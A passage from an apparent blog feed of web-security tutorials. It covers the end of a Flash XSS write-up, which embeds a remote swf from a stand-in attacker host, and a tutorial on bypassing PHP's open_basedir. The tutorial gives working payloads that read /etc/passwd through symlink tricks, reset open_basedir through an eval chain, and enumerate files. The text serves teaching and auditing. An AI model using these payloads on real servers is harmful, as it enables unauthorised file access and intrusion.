class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowNetworking"</span> <span class="attr">value</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"Flashvars"</span> <span class="attr">value</span>=<span class="string">"swf=http://attack.com/Mi1k7ea.swf"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>至于Mi1k7ea.swf文件，是前面第一节示例用于XSS弹框的Demo，这里作为攻击者的恶意swf文件。</p><p>先看下直接访问XSFTest.swf文件再传入远程服务器上的swf文件看看能不能执行成功：</p><p><img src="/2019/07/21/Flash型XSS小结/19.png" alt=""></p><p>可以看到，请求了远程服务器上的swf文件但并没有成功执行该swf文件。原因在于远程服务器上的swf文件并没有对Flash的跨域请求进行相应的授权。</p><p>如果访问目标服务器的XSF.html页面，可以看到XSF.html中嵌入的XSFTest.swf文件通过参数传入成功调用了远程服务器上的swf文件，关键在于allowScriptAccess和allowNetworking的设置进行了授权：</p><p><img src="/2019/07/21/Flash型XSS小结/18.png" alt=""></p><h2 id="0x03-漏洞挖掘"><a href="#0x03-漏洞挖掘" class="headerlink" title="0x03 漏洞挖掘"></a>0x03 漏洞挖掘</h2><h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>由于Flash XSS是前端问题，swf文件可下载到本地且是可反编译的，因此就可直接进行白盒测试。</p><h3 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h3><p>简单分为以下几步：</p><p>1、将目标swf文件下载到本地，反编译得到源码；</p><p>2、搜索危险函数，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ExternalInterface.call()</span><br><span class="line">getURL()</span><br><span class="line">navigateToURL()</span><br><span class="line">htmlText</span><br><span class="line">loadVariables()</span><br><span class="line">loadMovie()</span><br><span class="line">loadMovieNum()</span><br><span class="line">FScrollPane.loadScrollContent()</span><br><span class="line">LoadVars.send()</span><br><span class="line">LoadVars.load()</span><br><span class="line">XML.load()</span><br><span class="line">Sound.loadSound()</span><br><span class="line">NetStream.play()</span><br></pre></td></tr></table></figure><p>3、若存在危险函数，则进一步查找是否有接受外部输入参数的关键字，即寻找AS2和AS3下的传参关键字，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_root.argv</span><br><span class="line">loaderInfo.parameters</span><br></pre></td></tr></table></figure><p>4、若都存在，则需要进行最后的人工代码审计。</p><h2 id="0x04-防御方法"><a href="#0x04-防御方法" class="headerlink" title="0x04 防御方法"></a>0x04 防御方法</h2><ul><li>如果无嵌入Flash的需求，尽量禁用embed和object标签；</li><li>对Flash文件的输入输出编码过滤；</li><li>在HTML中嵌入Flash时，严格设置allowScriptAccess参数和allowNetworking参数的值，遵循权限最小化原则；</li><li>可参考一些网上写好的过滤函数，如：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public static function checkJsFunctionValid(functionName:String):Boolean</span><br><span class="line">&#123;</span><br><span class="line">var reg:RegExp = /^[a-zA-Z0-9_\.]+$/;</span><br><span class="line">return reg.test(functionName);</span><br><span class="line">&#125;          </span><br><span class="line"></span><br><span class="line">public static function checkObjectIdValid():Boolean</span><br><span class="line">&#123;</span><br><span class="line">    if (ExternalInterface.available)</span><br><span class="line">    &#123;</span><br><span class="line">        var objectId:String = ExternalInterface.objectID;</span><br><span class="line">        if (!objectId || (objectId == objectId.replace(/[^0-9a-zA-Z_]/g , &quot;&quot;)))</span><br><span class="line">        return true;</span><br><span class="line">        else</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://joychou.org/web/flash-xss.html#directory061280281423452145" target="_blank" rel="noopener">Flash XSS Security</a></p><p><a href="https://aq.163.com/module/pedia/article-00035.html" target="_blank" rel="noopener">浅谈flash引发的跨站问题</a></p><p><a href="https://www.secpulse.com/archives/44299.html" target="_blank" rel="noopener">Flash XSS攻击总结</a></p><p><a href="https://cloud.tencent.com/developer/article/1089548" target="_blank" rel="noopener">常见Flash XSS攻击方式</a></p><p><a href="https://www.cnblogs.com/kenkofox/p/3405395.html" target="_blank" rel="noopener">Flash XSS 漏洞详解 根治的好办法</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://www.mi1k7ea.com/tags/XSS/"/>
    
      <category term="Flash" scheme="https://www.mi1k7ea.com/tags/Flash/"/>
    
  </entry>
  
  <entry>
    <title>浅谈几种Bypass open_basedir的方法</title>
    <link href="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>https://www.mi1k7ea.com/2019/07/20/浅谈几种Bypass-open-basedir的方法/</id>
    <published>2019-07-20T03:24:35.000Z</published>
    <updated>2019-07-20T11:56:38.605Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-open-basedir"><a href="#0x01-open-basedir" class="headerlink" title="0x01 open_basedir"></a>0x01 open_basedir</h2><p>open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。</p><p>假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。</p><p>注意：用open_basedir指定的<strong>限制实际上是前缀，而不是目录名</strong>。</p><p>为了演示下面的几个示例，我这里环境的open_basedir设置为Web目录和tmp目录：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/1.png" alt=""></p><p>测试一下，我在/home目录中新建一个1.txt文件，尝试对其进行读取，发现读取失败：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/2.png" alt=""></p><p>换了Web目录及其子目录和tmp目录中的文件就能成功读取，这就是open_basedir所起到的作用。</p><h2 id="0x02-利用命令执行函数Bypass"><a href="#0x02-利用命令执行函数Bypass" class="headerlink" title="0x02 利用命令执行函数Bypass"></a>0x02 利用命令执行函数Bypass</h2><p>但是open_basedir对命令执行函数没有限制，我们可以使用system()函数试一下，在前面的代码前加上system()代码来进行对比：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//echo file_get_contents('/home/1.txt');</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">system(<span class="string">'cat /home/1.txt'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>确实能够成功读到目标文件，不受open_basedir的限制：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/3.png" alt=""></p><p>至于其他的命令执行函数可自行尝试。</p><p>但是一般情况下，system()等命令执行函数可能会被disable_functions给禁用掉，因此运用到的场景可能并不多。</p><h2 id="0x03-利用symlink-函数Bypass"><a href="#0x03-利用symlink-函数Bypass" class="headerlink" title="0x03 利用symlink()函数Bypass"></a>0x03 利用symlink()函数Bypass</h2><h3 id="符号链接"><a href="#符号链接" class="headerlink" title="符号链接"></a>符号链接</h3><blockquote><p>符号链接又叫软链接，是一类特殊的文件，这个文件包含了另一个文件的路径名(绝对路径或者相对路径)。路径可以是任意文件或目录，可以链接不同文件系统的文件。在对符号文件进行读或写操作的时候，系统会自动把该操作转换为对源文件的操作，但删除链接文件时，系统仅仅删除链接文件，而不删除源文件本身。</p></blockquote><h3 id="symlink-函数"><a href="#symlink-函数" class="headerlink" title="symlink()函数"></a>symlink()函数</h3><p>(PHP 4, PHP 5, PHP 7)</p><p>symlink()函数创建一个从指定名称连接的现存目标文件开始的符号连接。如果成功，该函数返回TRUE；如果失败，则返回FALSE。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">symlink ( string $target , string $link ) : bool</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">target</td><td style="text-align:left">必需。连接的目标。</td></tr><tr><td style="text-align:left">link</td><td style="text-align:left">必需。连接的名称。</td></tr></tbody></table><p>当然一般情况下这个target是受限于open_basedir的。</p><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>先给出payload，原理在后面说明，这里需要跨几层目录就需要创建几层目录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mkdir(<span class="string">"A"</span>);</span><br><span class="line">chdir(<span class="string">"A"</span>);</span><br><span class="line">mkdir(<span class="string">"B"</span>);</span><br><span class="line">chdir(<span class="string">"B"</span>);</span><br><span class="line">mkdir(<span class="string">"C"</span>);</span><br><span class="line">chdir(<span class="string">"C"</span>);</span><br><span class="line">mkdir(<span class="string">"D"</span>);</span><br><span class="line">chdir(<span class="string">"D"</span>);</span><br><span class="line">chdir(<span class="string">".."</span>);</span><br><span class="line">chdir(<span class="string">".."</span>);</span><br><span class="line">chdir(<span class="string">".."</span>);</span><br><span class="line">chdir(<span class="string">".."</span>);</span><br><span class="line">symlink(<span class="string">"A/B/C/D"</span>,<span class="string">"7ea"</span>);</span><br><span class="line">symlink(<span class="string">"7ea/../../../../etc/passwd"</span>,<span class="string">"exp"</span>);</span><br><span class="line">unlink(<span class="string">"7ea"</span>);</span><br><span class="line">mkdir(<span class="string">"7ea"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问该PHP文件后，后台便生成了两个目录和一个名为exp的符号链接：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/4.png" alt=""></p><p>在Web中我们直接访问exp即可读取到目标文件：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/5.png" alt=""></p><p>原理就是：创建一个链接文件7ea，用相对路径指向A/B/C/D，再创建一个链接文件exp指向7ea/../../../../etc/passwd。其实指向的就是A/B/C/D/../../../../etc/passwd，其实就是/etc/passwd。这时候删除7ea，再创建一个7ea目录，但exp还是指向7ea/../../../etc/passwd，所以就成功跨到/etc/passwd了。 </p><p>重点在这四句： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">symlink(<span class="string">"A/B/C/D"</span>,<span class="string">"7ea"</span>);</span><br><span class="line">symlink(<span class="string">"7ea/../../../../etc/passwd"</span>,<span class="string">"exp"</span>);</span><br><span class="line">unlink(<span class="string">"7ea"</span>);</span><br><span class="line">mkdir(<span class="string">"7ea"</span>);</span><br></pre></td></tr></table></figure><p>payload构造的注意点就是：要读的文件需要往前跨多少路径，就得创建多少层的子目录，然后输入多少个../来设置目标文件。</p><h2 id="0x04-利用glob-伪协议Bypass"><a href="#0x04-利用glob-伪协议Bypass" class="headerlink" title="0x04 利用glob://伪协议Bypass"></a>0x04 利用glob://伪协议Bypass</h2><h3 id="glob-伪协议"><a href="#glob-伪协议" class="headerlink" title="glob://伪协议"></a>glob://伪协议</h3><p>glob:// — 查找匹配的文件路径模式。</p><p>glob://是php自5.3.0版本起开始生效的一个用来筛选目录的伪协议，其用法示例如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 循环 ext/spl/examples/ 目录里所有 *.php 文件</span></span><br><span class="line"><span class="comment">// 并打印文件名和文件尺寸</span></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob://ext/spl/examples/*.php"</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    printf(<span class="string">"%s: %.1FK\n"</span>, $f-&gt;getFilename(), $f-&gt;getSize()/<span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Bypass-1"><a href="#Bypass-1" class="headerlink" title="Bypass"></a>Bypass</h3><p>只是用glob://伪协议是无法直接绕过的，它需要结合其他函数组合利用，主要有以下两种利用方式，局限性在于它们都只能列出根目录下和open_basedir指定的目录下的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。</p><h3 id="方式1——DirectoryIterator-glob"><a href="#方式1——DirectoryIterator-glob" class="headerlink" title="方式1——DirectoryIterator+glob://"></a>方式1——DirectoryIterator+glob://</h3><p>DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口。</p><p>DirectoryIterator与glob://结合将无视open_basedir，列举出根目录下的文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">$a = <span class="keyword">new</span> DirectoryIterator($c);</span><br><span class="line"><span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    <span class="keyword">echo</span>($f-&gt;__toString().<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入<code>glob:///*</code>即可列出根目录下的文件，但是会发现只能列根目录和open_basedir指定的目录的文件：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/6.png" alt=""></p><h3 id="方式2——opendir-readdir-glob"><a href="#方式2——opendir-readdir-glob" class="headerlink" title="方式2——opendir()+readdir()+glob://"></a>方式2——opendir()+readdir()+glob://</h3><p>opendir()函数为打开目录句柄，readdir()函数为从目录句柄中读取条目。</p><p>这里结合两个函数来列举根目录中的文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'c'</span>];</span><br><span class="line"><span class="keyword">if</span> ( $b = opendir($a) ) &#123;</span><br><span class="line">    <span class="keyword">while</span> ( ($file = readdir($b)) !== <span class="keyword">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $file.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir($b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>效果和方式1是一样的，只能Bypass open_basedir来列举根目录中的文件，不能列举出其他非根目录和open_basedir指定的目录中的文件。</p><h2 id="0x05-利用chdir-与ini-set-组合Bypass"><a href="#0x05-利用chdir-与ini-set-组合Bypass" class="headerlink" title="0x05 利用chdir()与ini_set()组合Bypass"></a>0x05 利用chdir()与ini_set()组合Bypass</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>这种利用方式跟open_basedir存在缺陷的处理逻辑有关，具体原理可参考：</p><p><a href="https://www.jianshu.com/p/98535e6c54df" target="_blank" rel="noopener">《通过chdir来bypass open_basedir》</a></p><p><a href="https://www.4hou.com/web/17357.html" target="_blank" rel="noopener">《从PHP底层看open_basedir bypass》</a></p><h3 id="Bypass-2"><a href="#Bypass-2" class="headerlink" title="Bypass"></a>Bypass</h3><p>测试Demo，放置在Web根目录下，在执行输入参数的PHP代码前后获取open_basedir的值看是否改变了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'open_basedir: '</span>.ini_get(<span class="string">'open_basedir'</span>).<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'GET: '</span>.$_GET[<span class="string">'c'</span>].<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">'c'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'open_basedir: '</span>.ini_get(<span class="string">'open_basedir'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入以下payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">'mi1k7ea'</span>);chdir(<span class="string">'mi1k7ea'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="keyword">echo</span> file_get_contents(<span class="string">'/etc/passwd'</span>);</span><br></pre></td></tr></table></figure><p>可以看到open_basedir被设置为’/‘了，整个失去了效果：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/7.png" alt=""></p><p>注意，如果php文件在Web根目录，则需要构造一个相对可上跳的open_basedir：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">'mi1k7ea'</span>);</span><br><span class="line">chdir(<span class="string">'mi1k7ea'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br></pre></td></tr></table></figure><p>如果php文件直接在Web目录的子目录的话，就可不用创建相对可上跳的open_basedir了。</p><h2 id="0x06-利用bindtextdomain-函数Bypass"><a href="#0x06-利用bindtextdomain-函数Bypass" class="headerlink" title="0x06 利用bindtextdomain()函数Bypass"></a>0x06 利用bindtextdomain()函数Bypass</h2><h3 id="bindtextdomain-函数"><a href="#bindtextdomain-函数" class="headerlink" title="bindtextdomain()函数"></a>bindtextdomain()函数</h3><p>(PHP 4, PHP 5, PHP 7)</p><p>bindtextdomain()函数用于绑定domain到某个目录的函数。</p><p>函数定义如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bindtextdomain ( string $domain , string $directory ) : string</span><br></pre></td></tr></table></figure><h3 id="Bypass-3"><a href="#Bypass-3" class="headerlink" title="Bypass"></a>Bypass</h3><p>利用原理是基于报错：bindtextdomain()函数的第二个参数\$directory是一个文件路径，它会在\$directory存在的时候返回\$directory，不存在则返回false。</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">'&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;'</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">$re = bindtextdomain(<span class="string">'xxx'</span>, $_GET[<span class="string">'dir'</span>]);</span><br><span class="line">var_dump($re);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>成功访问到存在的文件是会返回当前文件的路径的：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/8.png" alt=""></p><p>若访问的文件不存在则返回false：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/9.png" alt=""></p><p>可以看到，和前面几种方法相比，实在是相形见绌，只能应用于判断目标文件是否存在，有利于后续和其他漏洞进行组合利用。</p><h2 id="0x07-利用SplFileInfo-getRealPath-类方法Bypass"><a href="#0x07-利用SplFileInfo-getRealPath-类方法Bypass" class="headerlink" title="0x07 利用SplFileInfo::getRealPath()类方法Bypass"></a>0x07 利用SplFileInfo::getRealPath()类方法Bypass</h2><h3 id="SplFileInfo类"><a href="#SplFileInfo类" class="headerlink" title="SplFileInfo类"></a>SplFileInfo类</h3><p>(PHP 5 &gt;= 5.1.2, PHP 7)</p><p>SplFileInfo类为单个文件的信息提供高级面向对象的接口。</p><p><strong>SplFileInfo::getRealPath</strong></p><p>(PHP 5 &gt;= 5.2.2, PHP 7)</p><p>SplFileInfo::getRealPath类方法是用于获取文件的绝对路径。</p><h3 id="Bypass-4"><a href="#Bypass-4" class="headerlink" title="Bypass"></a>Bypass</h3><p>和bindtextdomain的原理一样，是基于报错的方式，返回结果都是一样的，就不再多演示，这里直接给出payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;b&gt;open_basedir: '</span> . ini_get(<span class="string">'open_basedir'</span>) . <span class="string">'&lt;/b&gt;&lt;br /&gt;'</span>;</span><br><span class="line">$info = <span class="keyword">new</span> SplFileInfo($_GET[<span class="string">'dir'</span>]);</span><br><span class="line">var_dump($info-&gt;getRealPath());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x08-利用realpath-函数Bypass"><a href="#0x08-利用realpath-函数Bypass" class="headerlink" title="0x08 利用realpath()函数Bypass"></a>0x08 利用realpath()函数Bypass</h2><h3 id="realpath-函数"><a href="#realpath-函数" class="headerlink" title="realpath()函数"></a>realpath()函数</h3><p>(PHP 4, PHP 5, PHP 7)</p><p>realpath — 返回规范化的绝对路径名。它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。</p><p>函数定义如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">realpath ( string $path ) : string</span><br></pre></td></tr></table></figure><h3 id="Bypass-5"><a href="#Bypass-5" class="headerlink" title="Bypass"></a>Bypass</h3><p>环境条件：Windows</p><p>基本原理是基于报错返回内容的不用，设置自定义的错误处理函数，循环遍历匹配到正则的报错信息的字符来逐个拼接成存在的文件名，另外是需要结合利用Windows下的两个特殊的通配符&lt;和&gt;，不然只能进行暴破。</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;"</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">set_error_handler(<span class="string">'isexists'</span>);</span><br><span class="line">$dir = <span class="string">'E:/wamp64/'</span>;</span><br><span class="line">$file = <span class="string">''</span>;</span><br><span class="line">$chars = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789_'</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($chars); $i++) &#123;</span><br><span class="line">        $file = $dir . $chars[$i] . <span class="string">'&lt;&gt;&lt;'</span>;</span><br><span class="line">        realpath($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isexists</span><span class="params">($errno, $errstr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $regexp = <span class="string">'/File\((.*)\) is not within/'</span>;</span><br><span class="line">        preg_match($regexp, $errstr, $matches);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($matches[<span class="number">1</span>])) &#123;</span><br><span class="line">                printf(<span class="string">"%s &lt;br/&gt;"</span>, $matches[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，首字母不同的文件就被列出来了，首字母相同的文件中只列了第一个：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/10.png" alt=""></p><h2 id="0x09-脚本合集"><a href="#0x09-脚本合集" class="headerlink" title="0x09 脚本合集"></a>0x09 脚本合集</h2><h3 id="p牛的脚本"><a href="#p牛的脚本" class="headerlink" title="p牛的脚本"></a>p牛的脚本</h3><p>脚本原理就是利用symlink()函数来Bypass的原理。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* by phithon</span></span><br><span class="line"><span class="comment">* From https://www.leavesongs.com</span></span><br><span 